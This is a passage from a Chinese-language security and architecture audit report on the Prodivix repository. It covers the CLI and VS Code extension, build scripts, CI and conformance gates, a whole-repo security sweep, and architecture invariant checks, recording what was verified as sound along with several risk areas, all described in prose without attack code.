- apps/asset-delivery-host:src/assetDeliveryHttpHandler.ts、assetDeliverySessionStore.ts、assetDeliverySecurityPolicy.ts、assetDeliveryScannerPolicy.ts、assetDeliveryScannerRuntime.ts、requiredScannerRuntime.ts、clamAvContentScanner.ts、clamAvDaemonReadiness.ts、clamAvScannerFleet.ts、yaraXScannerRuntime.ts、sharpRasterTransformer.ts、main.ts;scripts/verify-clamav-gate.ts;rules/prodivix-baseline.yar;以及全部 package.json/vitest/tsconfig 文件。
  略读的测试:httpHandler.integration.test.ts、assetDeliveryHttpHandler.test.ts、terminalStateCrossRegionRecovery.test.ts、terminalStateAwsKms.live.test.ts、clamAvScannerFleet/clamAvDaemonReadiness/requiredScannerRuntime/yaraX 相关测试。未发现测试策略违规(没有 querySelector/closest/parentElement/DOM 层级/snapshot 断言;实时 AWS KMS 关卡在环境变量缺失时正确地调用 `context.skip()`,并在配置不完整时明确报错)。

为验证结论可达性而阅读的跨分区代码:packages/runtime-remote/src/remoteExecutionControlPlane.ts(putArtifact/serverAuthority)、remoteExecutionRegionalRecoveryOperator.ts(证明过期强制)、replicatedRemoteExecutionTerminalBrokerSupport.ts(密码失败分类)、remoteExecutionHttpTransport.ts(制品下载消费方)、remoteExecutionServerAuthority.ts;packages/runtime-remote-postgres/src/postgresExecutionRepository.ts(putArtifact 的大小/digest 校验);packages/assets/src/binaryAsset.ts 与 binaryAssetPipeline.ts(媒体分类、策略变更时的派生缓存重扫);packages/runtime-core/src/executionPreviewBundle.ts、executionBuildBundle.ts、executionSecretLeakGuard.ts;apps/backend/internal/modules/workspace/handlers_asset_delivery.go(资产分发调用方)。

未覆盖:真实 `yara-x` CLI 的 JSON schema 与 `clamd` 线上响应的运行时行为(不允许执行);我只验证了两个解析器在任何偏差下都失败关闭。

**结构观察**: 以下是我专门探查并确认稳妥的区域,因此不应再被草率复审:

**认证/授权覆盖。** `httpHandler.ts` 中的每条路由都有门禁:`/healthz` 与 `/readyz` 是仅有的免认证路由且不暴露任何数据;制品下载与所有 `/v1/*` 路由都要求 `authenticateClient`;全部十一条 `/internal/v1/*` 路由都要求 `workerAuth`;terminal 的 read/write/resize/signal/close 委托给 broker 的访问令牌。区域流量闸门在每条非 `/healthz` 路由之前获取,并在 `finally` 中释放。`getArtifact` 通过 `principal.subjectId` 限定归属者作用域。

**terminal 状态的加密很扎实。** 不存在 IV/nonce 重用:`terminalStateCipher` 每次封装抽取新的 12 字节 nonce,`terminalStateManagedCipher` 每次封装同时抽取新的数据密钥和新的 nonce。任何地方都没有数据密钥缓存(每次打开都要付出一次 KMS `Decrypt`,这是成本/延迟权衡,而非安全权衡)。PRT1 与 PRT2 的信封解析都做了边界检查,且每个带长度前缀的字段(providerId、keyId、metadata、wrappedKey)都通过 AAD 被传递性地认证,因此信封形状层面的可塑性会失败关闭。跨区域 MRK 恢复是正确的:`stableKeyIdentity` 仅对 `mrk-` 资源 id 才把 ARN 的区域部分通配化,`encryptionContext` 与区域无关,`readConfiguration` 把每个 ARN 固定到所配置的区域。`RemoteExecutionTerminalStateCipherUnavailableError` 与 `TypeError` 的分类在 broker 中分别映射为 `unavailable` 与 `identity-conflict` —— 绝不会映射为状态删除。

**签名证明的校验密不透风。** Ed25519 密钥按 SPKI 指纹做角色分离,签名是在重新规范化后的载荷上重新验证的(因此无法夹带额外字段),授权 grant 会经过以 `sha256(payload‖0‖signature)` 为键的重放存储,并且 Node/OpenSSL 会拒绝非规范的 `S`,所以不存在可塑性重放。fence/attestation 的过期在该 port 中未被检查,但*确实*在 `remoteExecutionRegionalRecoveryOperator.ts:1013-1021` 中通过 `maximumProofLifetimeMs` 得到强制。有一处潜在隐患值得记录,但不构成可达缺陷:`stableJson`(regionalRecoverySignedProof.ts:74)用 `localeCompare` 对对象键排序,该函数依赖 ICU/locale,而它所处的是一个外部签发方必须逐字节复现的*规范签名编码*。当前在用的每一组键(`claim/format/keyId/kind/signature/version` 以及三种 claim 形状)都在小写 ASCII 位置上首次出现差异,因此今天没有任何 locale 会产生不同的顺序 —— 但只要再增加一个键,就可能导致跨主机的签名校验中断。改用默认按码位的 `.sort()` 是一个零成本修复。

**资产分发中的缓存投毒被正确阻止。** 我追踪了派生缓存的命中路径:`executeBinaryAssetTransformPipeline`(binaryAssetPipeline.ts:677-699)会把缓存 attestation 的 `scannerId`/`scannerVersion` 与实时描述符比对,任何不匹配都会强制重新扫描。由于 `createRequiredAssetDeliveryScannerRuntime` 把每个子代际 + 策略版本 + 扫描器描述符都折叠进合成的 `policyVersion`,任何 ClamAV 特征库或 YARA-X 规则变更都会让全部已缓存的派生资产失效。我还追踪了 `acquireScannerSnapshot`/`assertSigningSnapshot` 中 `revokeAll()` 的交错情况,确认它既不会清除刚刚创建的会话,也不会让过期代际的会话存活:`previous` 读取与 `revokeAll()` 之间没有 `await` 隔开,而各 runtime 通过共享的 `pending` promise 对并发刷新去重,因此代际提升总是落在两个请求都能观察到的宏任务边界上。

**预览/资产的来源隔离是正确的。** 能力凭据是 32 个随机字节,仅以 SHA-256 哈希形式存储,承载于子域中,以带锚定的 `/^[a-f0-9]{64}$/` 匹配,后缀剥离逻辑会拒绝任何嵌套标签伪造(`a.b.<cap>.host`)。路径穿越不可达 —— 两个宿主都是对解码后的 bundle 做精确字符串查找,`requestFilePath` 还额外拒绝 `\`、NUL 以及 `.`/`..` 片段。预览的 CSP 正确地把 `frame-ancestors` 固定到已校验的编辑器来源,把 `connect-src` 固定到能力来源;资产分发则把所有内容固定为 `'none'` 并加上 `sandbox`。两者上的 `access-control-allow-origin: '*'` 在此是安全的,因为 URL 本身就是持有型能力凭据,从不涉及 cookie,并且 `referrer-policy: no-referrer` 阻断了显而易见的泄漏途径。

**值得做产品级决策的风险区域(不是代码缺陷)。** `apps/asset-delivery-host/rules/prodivix-baseline.yar` —— 即“必需的独立恶意软件引擎”的默认规则集 —— 恰好只包含两条规则:EICAR 测试串和 Prodivix 自己的关卡金丝雀。它不提供任何真实的检测覆盖。`ASSET_DELIVERY_YARAX_RULES_PATH` 允许部署指向真实规则集,`ASSET_DELIVERY_YARAX_RULES_DIGEST` 会对其做固定,但没有任何机制强制这样做:同时省略两者的部署会静默地以一个真实引擎(ClamAV)加一个空操作引擎来运行本应“必需两个独立引擎”的关卡。可以考虑在生产环境中强制要求 `ASSET_DELIVERY_YARAX_RULES_PATH`,或在加载到的规则 digest 等于基线 fixture 的 digest 时拒绝启动。

**我有意未列为发现的次要事项。** `readBytes`(httpHandler.ts:151)在写出 413 之前就销毁了请求流,因此超大上传可能看到 ECONNRESET 而不是该状态码。`sharpRasterTransformer.ts:181` 把任何*消息*匹配 `/timeout/i` 的错误归类为容量不可用,这可能把由内容触发的 libvips 错误误标为 503。`assetDeliveryHttpHandler.ts:575` 把所有未分类的错误统一归为 HTTP 400,因此一次瞬时的内部故障在 Go 后端看来是永久性的客户端错误。`regionalRecoveryOperatorJob.ts:161-163` 把 terminal 状态的密码配置解析了两次(无害且确定性)。这些都不会在真实调用路径上产生具体的错误结果。

### 5.27 `app-cli-vscode-scripts` — apps/cli, apps/vscode, vscode-debugger, root scripts

**覆盖范围**: 完整阅读:apps/cli(bin/prodivix.js、src/cli.ts、src/commands/build.ts、src/commands/export.ts、src/commands/deploy.ts [空]、src/utils/logger.ts [空]、test/cli.test.ts [空]、package.json、tsconfig.json、eslint.config.js);apps/vscode(package.json、src/index.ts、src/commands/previewPIR.ts [空]、src/language/pirDocumentSymbolProvider.ts、src/test/extension.test.ts、esbuild.js、tsconfig.json、.vscode-test.mjs、.vscodeignore、eslint.config.mjs、.vscode/tasks.json、.vscode/launch.json);packages/vscode-debugger(src/debugAdapter.ts、package.json、tsconfig.json);scripts/ —— 全部 22 个文件(verify-g0.mjs、verify-g2-rootless.mjs、check-editor-hard-cut.mjs、check-core-package-boundaries.mjs、check-pir-current-boundary.mjs、check-property-test-names.mjs、generate-diagnostic-docs.mjs、activate-pir-wire-version.mjs、bump-packages.mjs、sync-nodegraph-wire-contract.mjs、generate-tailwind-runtime-snapshot.mjs、generate-tailwind4-catalog.mjs、start-dev-backend.mjs、start-all.sh、stop-all.sh、dev-environment.ps1、start-dev-backend.ps1、start-dev-postgres.ps1、start-dev.bat、purge-any.py、strip-failing-tests.py、analyze-test-errors.py、analyze-test-results.py、plugin-artifacts/_.mjs);根 package.json 的 scripts;deploy/start-app.sh;apps/plugin-sandbox/scripts/_.mjs(相邻的根工具链)。对照 apps/backend/{server.go,cmd/server/main.go,Dockerfile,.air.toml}、apps/web/package.json、.github/workflows/tests.yml、packages/plugin-package/src/artifact.ts 以及 `git ls-files` 的实测 pathspec 行为交叉核对了各项结论。未覆盖:apps/plugin-sandbox/src(属其他分区)、除 plugin-artifact 生成器之外的 packages/*/scripts 构建辅助脚本;Python 分析脚本已阅读,但判断其缺陷程度不足以上报。

**结构观察**: 热点与结构性说明(非缺陷):

1. apps/cli 是一个空壳。`src/commands/deploy.ts` 与 `src/utils/logger.ts` 是零字节文件,`test/cli.test.ts` 为空(且未声明 `test` 脚本,因此 turbo 会跳过它)。两个真实命令只是 `console.log` 一个中文占位字符串。这里不会发生回归,因为这里什么都没做,但那些空的、未被引用的 .ts 文件仍被 `tsc` 无谓地编译进 `dist`。

2. apps/vscode 是未经修改的 `yo code` 脚手架。`"test": "echo \"No tests for vscode\" && exit 0"` 总是报告成功,而 `src/test/extension.test.ts`(其中只断言 `[1,2,3].indexOf(5) === -1`)从未被执行 —— `.vscode-test.mjs` 查找的是 `out/test/**`,而只有 `compile-tests` 会填充该目录,且没有任何东西运行它。`packages/vscode-debugger` 有同样的永远通过的 test 脚本,外加一个未使用的 vitest devDependency。`src/index.ts` 中的文档符号提供器与 debug adapter 工厂注册都被注释掉了,因此 `pir` 语言贡献和 `prodivix` 调试器类型虽然在 package.json 中声明,但功能上是惰性的。没有与安全相关的面:没有对 workspace trust 敏感的 API,没有 shell 执行,没有凭证处理,而 debug adapter(`packages/vscode-debugger/src/debugAdapter.ts`)只用常量回应 initialize/launch/threads/disconnect —— 不解析任何不可信的 DAP 载荷。

3. 整个工具链中的参数处理是干净的。`scripts/verify-g2-rootless.mjs` 显式拒绝未知参数,并在启用 `shell: true` 之前用允许列表正则筛查 Windows shell 记号;`scripts/activate-pir-wire-version.mjs` 只会把硬编码的 argv 数组通过 `cmd /c` 传入;`scripts/plugin-artifacts/generate-bundled-plugin-artifact.mjs` 拒绝未知标志。我在本分区中没有发现由用户可控输入引发的命令注入路径。

4. 在重要之处都存在且正确的路径穿越防护:`apps/plugin-sandbox/scripts/serve.mjs:39` 与 `scripts/plugin-artifacts/check-official-plugin-exports.mjs:513` 都在 `resolve` 之后用 `startsWith(root + sep)` 做锚定。

5. `scripts/plugin-artifacts/generate-bundled-plugin-artifact.mjs:742` 使用依赖 locale 的 `localeCompare` 对资源排序,而该顺序被固化进由 `--check` 比对的已提交 `artifact.generated.ts` 中。我没有上报它,因为 `computeBundledPluginPackageDigest` 会按原始字节重新排序(所以与安全相关的 digest 是确定性的),而且我验证了当前 8 个资源路径在 ICU 与码位两种顺序下排序结果一致。不过,一旦添加了带有标点相邻字母的路径,它仍是潜在的 CI 抖动风险。同样的 `localeCompare` 模式出现在 `scripts/generate-diagnostic-docs.mjs:210`(目前是安全的,因为所有代码都共用固定的 `XXX-dddd` 形状)。

6. `scripts/generate-diagnostic-docs.mjs` 会静默丢弃任何不匹配 `^### \\`[A-Z]+-\\d{4}\\` (.+)$` 的 `### ` 标题 —— 一个写错的代码(3 位数字、缺少反引号)在 `generate` 与 `check` 中都既不生成页面也不报错。只有 PLG 命名空间会与源码交叉核对(`validatePluginDiagnosticCoverage`)。目前没有任何 spec 文件存在格式错误的标题,因此今天不存在可达的失败。

7. `scripts/start-all.sh:230` 为 `nohup pnpm dlx serve ... &` 记录了 `$!`,而那是 pnpm 包装进程,而非它派生的 `serve` 进程;`stop_if_running` 与 `scripts/stop-all.sh` 只会向记录下来的这个 PID 发送信号。静态服务器是否真的会成为孤儿进程,取决于 pnpm 对 `dlx` 的信号转发行为,而我无法通过静态分析确定,因此没有把它列入发现。

8. `scripts/generate-tailwind-runtime-snapshot.mjs` 与 `scripts/generate-tailwind4-catalog.mjs` 都在已提交的 JSON 输出中嵌入了 `generatedAt: new Date().toISOString()`,这保证了每次重新生成都会产生 diff。目前没有任何关卡比对这些文件,所以它只是噪音而非失效的检查 —— 但一旦加入 `--check` 模式,它就会变成确定性缺陷。

### 5.28 `infra-gates` — golden-conformance, e2e tests, CI workflows, build config

**覆盖范围**: 用 `git ls-files` 枚举了该分区(69 个文件:packages/golden-conformance 下 38 个、tests/ 下 10 个、17 个 GitHub workflow、turbo.json,外加所有被跟踪的 tsconfig/vitest/eslint 配置与根 package.json)。

完整阅读:`packages/golden-conformance/src` 下的每个文件(goldenG1Scenario.ts 1330L、goldenG2AuthServerMatrix.ts 1302L、generatedProjectHarness.ts 558L、goldenSyncScenario.ts 487L、goldenAuthoring.ts、goldenScenario.ts、index.ts、goldenG2BrowserHarness.ts、goldenG2RemoteHarness.ts、goldenG2ExecutionFixture.ts、goldenG2ExecutionMatrix.ts)以及全部 12 个 conformance/property/browser 测试文件;两个 `scripts/emit*.ts`;该包的 `package.json`、`vitest.config.ts`、`tsconfig.json`。

完整阅读:全部 17 个 `.github/workflows/*.yml`;`turbo.json`;根 `package.json`(110 个脚本);`tsconfig.base.json`、根 `tsconfig.json`、`apps/web/tsconfig{,.app,.node}.json`、`packages/ui/tsconfig.json`、`packages/golden-conformance/tsconfig.json`、`packages/plugin-contracts/tsconfig.json`;`apps/web/eslint.config.js`、`.eslintrc.cjs` 以及整个 `packages/eslint-plugin-prodivix`;`apps/web/vitest.config.ts` 与每个被跟踪的 `vitest.config.ts` 的 `include`/`exclude` 模式。

完整阅读:`tests/e2e/playwright.config.mts`、`tests/e2e/binary-assets.playwright.config.mts`,以及全部四个非空 spec(binary-asset-product-journey 850L、official-component-plugins、plugin-sandbox、smoke)。

所做的横切分析:(a) 脚本化地检查全部 110 个根 npm 脚本从每个 workflow 文件出发、经由 `pnpm run` 链传递的可达性,以找出 CI 从不调用的关卡;(b) 脚本化地检查每个被跟踪的 `*.test.ts(x)` 文件是否匹配其所属包的 vitest `include` glob(未发现不匹配);(c) 枚举每个工作区 `package.json` 的 `lint`/`test` 脚本;(d) 验证 `ExecutionJob.subscribe` 会重放缓冲的历史(`packages/runtime-core/src/executionJob.ts:430`),从而排除了 Golden Browser/Remote harness 中看似存在的 subscribe-after-start 竞态。

未覆盖:`goldenG2VueCatalogFixture.ts`(945L)、`goldenG2AuthServerFixture.ts`(427L)、`goldenApp.fixture.ts`(340L)与 `goldenG2VueTargetFixture.ts`(273L)的 fixture 主体只按结构和金丝雀常量做了略读,而非逐行阅读;`apps/backend` 的 Makefile/Go 工具链以及 `scripts/verify-*.mjs` 属于其他分区,仅在某个 workflow 调用它们时才做了查阅。

**结构观察**: golden-conformance 套件本身的健康度很高。这些场景确实是承重的:`goldenG1Scenario.ts` 在每个阶段都失败关闭(`requireReadyPlan`、`requireReadyOperation`、`editSingleControlledRegion` 在编辑未产生任何变化时抛错),并且证据记录在 `goldenG1.conformance.test.ts` 中用 `toMatchObject` 对约 18 个布尔事实做了穷尽断言。`verifyGoldenBrowserProject` 会收集 `pageerror`/console 错误并在有累积时抛出,还会在启动任何进程之前校验 `routePath` 与 bundle 的 `packageManager`。`resolveSafeOutputPath` 与 `readGoldenStaticResponse` 都包含路径逃逸防护。我在 17 个 workflow 中没有发现被吞掉的断言、`|| true` 或 `continue-on-error`;两个使用 `set +e` 的 shell 关卡(`g2-binary-asset-malware.yml`、`g2-rootless-sandbox.yml`)都正确捕获了 `PIPESTATUS[0]`,并在收集证据后以该值 `exit`。

低于发现门槛、但值得关注的风险区域:

1. `packages/golden-conformance/vitest.config.ts` 设置了 `testTimeout: 30_000`,但没有设置 `hookTimeout`,因此 `beforeAll` 沿用 10s 的默认值。`goldenG2ExecutionMatrix.conformance.test.ts:12` 在一个未设超时的 `beforeAll` 中运行了整个 browser+remote 矩阵,而 `goldenG2AuthServerMatrix.conformance.test.ts:33` 显式传入了 `30_000` —— 而后者的 hook 会在 `Promise.all` 下派生六个 Node 子进程,每个进程有 120s 的预算。这是一个抖动源(会明确失败,而非静默),但这种不对称看起来并非有意为之。

2. `goldenG2ExecutionFixture.ts:92` 在生成的 `src/App.test.tsx` 不携带 `sourceTrace` 时会静默回退到工作区级别的 trace:`snapshot.files.find(...)?.sourceTrace ?? goldenG2WorkspaceSourceTrace(snapshot)`。对应的关卡(`goldenG2ExecutionMatrix.conformance.test.ts:130`)只断言 `sourceTrace?.length > 0`,而单元素的回退值总能满足它,因此一次丢弃逐文件测试 trace 的编译器回归在 Remote 侧会被部分掩盖。

3. `tests/e2e/specs/binary-asset-product-journey.spec.ts` 在 `page.route` 处理器内部执行 `expect(...)`(例如第 391 行、449-451 行、558-561 行)。route 处理器内的断言失败不会在断言处让测试失败 —— 该路由不会被 fulfill,请求会一直挂起直到导航/操作超时,从而造成令人困惑的诊断。此外,该 spec 中的“净化”证据是自我指涉的:`SANITIZED_JPEG` 派生自基线 fixture(从未包含 `JPEG_CANARY`),而变换本身在第 699 行被 Playwright 路由完全 mock 掉了,因此第 725 行的 `expect(...includes(JPEG_CANARY)).toBe(false)` 只是一次 fixture 的合理性检查,而不是分发宿主确实剥离了注释段的证明。

4. `goldenG2BinaryAssetTargetMatrix.conformance.test.ts:122-139` 把一个与 target 无关的断言(`createBinaryAssetPublicDeliveryRequest(mime)` 只接受一个 MIME 类型)包在 `for (const target of ['react-vite','vue-vite'])` 循环中,因此“两个框架 target 使用相同请求”这一主张实际上并未跨 target 得到验证 —— 循环体只是把相同的工作做了两遍。

5. `goldenG2AuthServerMatrix.ts` 从 `runIsolatedSecretProduction` 返回了 `authorityConsumed`,但第 1251 行的报告在 `isolated-secret` 单元格中丢弃了它,因此该字段被计算出来却从未被断言 —— 这是安全矩阵中的死证据。

6. 确定性小瑕疵:`goldenSyncScenario.ts:68` 与 `goldenApp.property.test.ts:22` 使用 `String.prototype.localeCompare` 来做规范键排序。在同一次运行中比较双方都使用同一个函数,因此今天不会产生误通过,但在规范化辅助函数内部使用对 locale 敏感的排序是脆弱的,尤其当输出被持久化或跨环境比较时;使用 `<`/`>` 或带显式 locale 的 `Intl.Collator` 会更安全。

7. 固定 action 的版本漂移:`smoke.yml` 使用 `actions/upload-artifact@b7c566a…  # v6`,而 `g2-rootless-sandbox.yml` 与 `g2-binary-asset-malware.yml` 使用 `@ea165f8d…  # v4`。两者都做了 SHA 固定(好事),但这种分裂意味着不同关卡之间的制品保留策略/行为并不一致。

### 5.29 `xcut-security` — CROSS-CUTTING: security sweep (whole repo)

**覆盖范围**: 对 3,009 个被跟踪文件做了全仓库安全扫查,先用 `git grep` 按简报中的 sink/密钥/加密/网络/路径模式检索,再完整阅读 grep 命中的文件。

完整阅读(生产源码):apps/remote-runner-control-plane/src/{httpHandler.ts, main.ts};apps/remote-runner-worker/src/rootlessPodmanSandbox.ts(1620 行)、apps/remote-runner-worker/sandbox/entry.mjs、apps/remote-runner-worker/install-proxy/entry.mjs、apps/remote-runner-worker/src/workerAgent.ts(密钥解析 + 脱敏区域);apps/remote-preview-host/src/{previewHttpHandler.ts, previewSecurityPolicy.ts, previewSessionStore.ts};apps/asset-delivery-host/src/{assetDeliveryHttpHandler.ts, assetDeliverySecurityPolicy.ts};apps/plugin-sandbox/src/runtimeBroker.ts、apps/plugin-sandbox/scripts/{serve.mjs, security-policy.mjs};apps/web/src/editor/features/blueprint/editor/runner/{BlueprintProjectRunnerSurface.tsx, blueprintProjectNetworkBridge.ts}(及其测试)、apps/web/src/editor/features/execution/remotePreviewOriginClient.ts、apps/web/src/infra/api/{apiClient.ts, apiConfig.ts}、apps/web/src/auth/useAuthStore.ts、apps/web/src/ai/aiSettingsStore.ts、apps/web/docker/nginx.conf;packages/plugin-browser/src/sandbox/createBrowserRuntimeSandboxFactory.ts、packages/plugin-browser/src/gateway/network/gatewayNetworkPolicy.ts、packages/plugin-browser/scripts/runtime-worker.entry.ts(引导区域);packages/runtime-core/src/executionSecretLeakGuard.ts、packages/runtime-core/src/executionTerminal.ts(salt 区域)、packages/runtime-core/src/executableProject.ts(投影区域);packages/ui/src/form/{PdxRichTextEditor.tsx, sanitizeRichTextEditorHtml.ts}、packages/shared/src/safety/{svg.ts, url.ts, embed.ts};packages/pir-react-renderer/src/host/iconRegistry.ts、packages/pir-react-renderer/src/runtime/reactProjection.ts;packages/workspace/src/workspaceCommand.ts(JSON-pointer 应用);packages/ai/src/{settings/aiSettings.ts, providers/openAICompatibleProvider.ts}。

已阅读的 Go 后端:internal/config/config.go、internal/platform/http/middleware/cors.go、internal/modules/auth/handlers.go(头像上传)、internal/modules/environment/crypto.go、internal/modules/integrations/github/{webhook.go, handlers.go, routes.go}、internal/modules/remoteexecution/{isolated_secret_broker.go, data_gateway_transport.go, data_gateway_stream.go(密钥 + 流生命周期区域)}。

已验证为干净、无发现的区域:SQL 构造(任何地方都没有把 `fmt.Sprintf` 拼进 SQL)、`data_gateway_transport.go` 中的 SSRF 出口管控(先解析再固定到已校验的公网 IP,禁用重定向)以及安装代理中的同类管控、GitHub webhook HMAC(常量时间比较,密钥未设置时失败关闭)、CORS(精确匹配,不带凭证)、environment/terminal 密码中的 AES-GCM 用法(随机 nonce,无 ECB,无硬编码 IV/密钥)、X25519+HKDF 的密钥信封封装、JSON-pointer 应用(`Object.defineProperty` + `Object.hasOwn`,无原型污染)、富文本/SVG 净化器(惰性 template 解析、按允许列表重建、丢弃事件处理器)、路径穿越防护(sandbox 中的 `childPath`、预览宿主中的 `requestFilePath`、`serve.mjs` 的前缀检查、头像上传使用服务端生成的 ID)、postMessage 处理器(全部检查 `event.source`,并检查 `event.origin` 或一个 nonce),以及每个服务边界上的常量时间令牌比较。

未覆盖:E2E/Playwright 规格、`apps/vscode`、`apps/cli`、`apps/docs`、生成文件(`*.generated.ts`、`src/generated/**`),以及完整的 964 行 `remoteexecution/handler.go` 和 849 行 `workspace/operation_commit_types.go`(仅就安全面做了略读 —— 对它们的逐包审查属于另一分区的范围)。我也没有在浏览器中静态验证 CSP-sandbox 的不透明来源结论;该结论是依据 HTML/CSP 规范以及它与已提交单元测试之间的矛盾推断得出的。

**结构观察**: 总体而言,对于一个 alpha 阶段的代码库来说,其安全姿态异常稳健,大多数常见问题类别是靠设计而非偶然被封堵的。

值得保留的强项:

- 每个网络/HTTP 边界(control plane、预览宿主、资产分发宿主)都独立地以精确键的记录检查重新校验请求体,对每一项字节预算设定上界,使用 `timingSafeEqual` 做令牌比较,并且从不回显内部错误。
- 远程执行的密钥路径构建得确实很好:带完整身份 AAD 的 X25519+HKDF-SHA256+AES-256-GCM 信封、30s TTL、一次性预留、围绕每次 `UseSecret` 的 grant 签发/撤销,以及手写的 JSON 字符串转义,使密钥材料从不经过通用序列化器。
- rootless podman 的 sandbox 调用非常周密(`--read-only`、`--cap-drop=ALL`、`--security-opt=no-new-privileges`、`--userns=keep-id`、安装阶段之后 `--network=none` 并验证断连、仅 tmpfs 的工作区、必须使用不可变镜像 digest)。
- SSRF 防御以大多数代码库都做错的方式做对了:`data_gateway_transport.go` 校验每个已解析的地址,然后直接拨号该已校验的 IP 字面量,从而封堵了 DNS 重绑定。

结构性风险区域 / 热点:

1. **把内容扫描当作安全控制。** `createExecutionSecretLeakGuard` 对跨日志、trace、制品和 terminal 输出的不变量 7 是承重的,但它只能看到字面字节序列。凡是流水线在 guard 运行之前对字节做了 base64、gzip 或其他变换的地方,该控制就静默地退化为空操作(发现 4)。可以考虑反转思路:在内容仍处于自然形态的位置做检查,并把“我无法以解码形式检查它”视为 `uninspectable`(guard 已经建模了该判定,但此处没有任何东西向它输入)。
2. **必须保持同步的重复策略集合。** sandbox 的忽略路径策略以两种不同定义存在于两处(发现 3);同样形态的漂移风险也存在于 `filesystemCapturePolicy`、wire 载荷构造器与 `entry.mjs` 的 `normalizeCapturePaths` 之间。它们应当合并为一个导出函数。
3. **来源模型在两个服务之间割裂。** 预览宿主与编辑器桥接对预览文档的来源编码了相互矛盾的假设(发现 2)。单元测试之所以通过,是因为它们断言的是来源*字符串*而非驱动真实文档,因此这一矛盾对 CI 不可见。任何只在浏览器中成立的不变量都需要浏览器级别的关卡。
4. **`apps/web` 出厂时没有 CSP。** `apps/web/docker/nginx.conf` 完全没有设置任何安全响应头,而预览宿主、资产宿主和插件 sandbox 各自都提供了精心调校的策略。编辑器恰恰是持有会话令牌和 LLM 密钥的来源,却是唯一未受保护的 —— 正是这一点把发现 1 从供应链层面的隐患升级为完整的账户失陷。
5. **`localStorage` 中的密钥。** 会话 bearer token 与 LLM 的 `apiKey` 都存放在脚本可读的存储中,这使得任何等价于 XSS 的原语(包括远程模块加载)都变成了凭证窃取原语。

已观察到但未列为发现的次要事项(没有具体可达的失败):`createFingerprintSalt`(packages/runtime-core/src/executionTerminal.ts:400)在 `globalThis.crypto` 缺失时回退到 `Math.random()`,但该 salt 只用于输入去重指纹,不构成认证边界;`normalizeSecretValues`(executionSecretLeakGuard.ts:114)对短于 4 个字符的受保护值是静默*丢弃*而非拒绝该配置;`sanitizeLinkHref`(packages/ui/src/form/sanitizeRichTextEditorHtml.ts:48)会原样放过协议相对的 `//host` 形式 href;`apps/plugin-sandbox/scripts/serve.mjs:50` 按原始解码后的路径查找按路由的安全响应头,因此 `//runtime-broker.html` 解析到同一文件却回退到不带 CSP 的响应头 —— 这仅限开发环境,生产使用的是 nginx 镜像。

### 5.30 `xcut-architecture` — CROSS-CUTTING: architecture invariant conformance (whole repo)

**覆盖范围**: 范围:全仓库(3009 个被跟踪文件)对 9 条架构不变量的横切符合性。仅通过 `git ls-files` / `git grep` 做发现;未扫描 node_modules 或构建产物。

完整阅读(生产源码):packages/workspace-sync/src/workspaceThreeWay.ts、workspaceOperationCommit.ts(部分)、jsonValue.ts、workspaceOutbox.ts(claim/selection)、packages/workspace/src/workspaceVfsIntent.ts、resolveCanonicalWorkspaceDocumentId.ts、authoring/workspaceSemanticRevision.ts;apps/web/src/editor/store/editorStore.workspaceSlice.ts、editor/workspaceSync/{workspaceOutboxExecutor, workspaceVfsOutboxExecutor, workspaceAuthoringOperationDispatcher, workspaceRevisionRecovery, workspaceConflictResolutionExecutor, localProjectWorkspaceOutbox, indexedDbCausalOutboxStore, indexedDbWorkspaceOutboxStore, WorkspaceOutboxEffects}.ts(x)、editor/Editor.tsx(加载路径)、editor/features/execution/{useExecutionFilesystemChanges, workspaceAssetMaterialization, executionSessionEnvironment}.ts、editor/features/code/useCodeAuthoringSession.ts、packages/authoring/src/codeAuthoring.ts(生命周期辅助函数)、apps/web/src/ai/aiSettingsStore.ts 与 packages/ai/src/settings/aiSettings.ts、apps/web/src/pir/createPublishedPirProjection.ts、packages/pir-react-renderer/src/runtime/reactProjection.ts、apps/web/src/plugins/platform/contributions/{renderPolicyResolver, resolverUtils}.ts、packages/plugin-contracts/src/{renderPolicy, validateRenderPolicyContribution, validateRenderPolicyContributionV1}.ts、新的 trigger 创作相关文件(triggerAuthoring.ts、useTriggerDraftAuthoring.ts)。

完整阅读的 Go 后端:modules/environment/{handler,models,store}.go、modules/workspace/{store_operation_commit,handlers_asset_delivery}.go 以及对 operation_commit_types.go 的 requirement 分析、modules/remoteexecution/isolated_secret_broker.go。另外还阅读了 apps/remote-runner-worker/src/remoteWorkerSecretRecipient.ts 与 apps/remote-runner-control-plane/src/secretBrokerClient.ts。

用定向 grep 进行的不变量扫查:packages/workspace 之外对 `docsById` 的直接写入(干净 —— 所有写入都位于 Command/Transaction/codec/VFS-intent 层或 fixture 中);每一处 `localStorage`/`sessionStorage` 调用点(除已上报的 AI 设置 store 外,全部是 UI 偏好);数值 PIR 版本向 domain/editor/renderer/compiler 的泄漏(干净 —— `version: 1` 仅出现在 packages/pir/src/codec 的 wire/migration 文件中);树形 PIR UI 写入(干净 —— apps/web 一致使用 `ui.graph.nodesById`/`childIdsById`);跨 feature 的编辑器 store 读取(仅共享的 execution/code 服务,没有扫描私有 store);packages/pir、workspace、router、nodegraph、animation、prodivix-compiler 中的非确定性(`Math.random`/`Date.now`)(仅出现在运行时/遥测路径,序列化输出中没有);`eval`/`new Function`/`dangerouslySetInnerHTML`(在生产中均不可达;renderer 会显式剥离 `dangerouslySetInnerHTML`)。

未覆盖:packages/ui、packages/themes、apps/docs、apps/vscode、apps/cli、golden-conformance 的 fixture,以及 packages/prodivix-compiler/src/react 中大部分独立运行时模板(仅略读)。插件 sandbox/能力强制(apps/plugin-sandbox、packages/plugin-host、packages/plugin-browser)只在贡献解析器边界做了抽查,假定由另一分区负责。Go 的 remoteexecution 数据/流网关(约 2500 行)与 apps/remote-runner-worker/src/rootlessPodmanSandbox.ts 未逐行阅读。

**结构观察**: 总体上不变量符合性很高,显然是此前多轮审计的成果。具体的结构性说明如下:

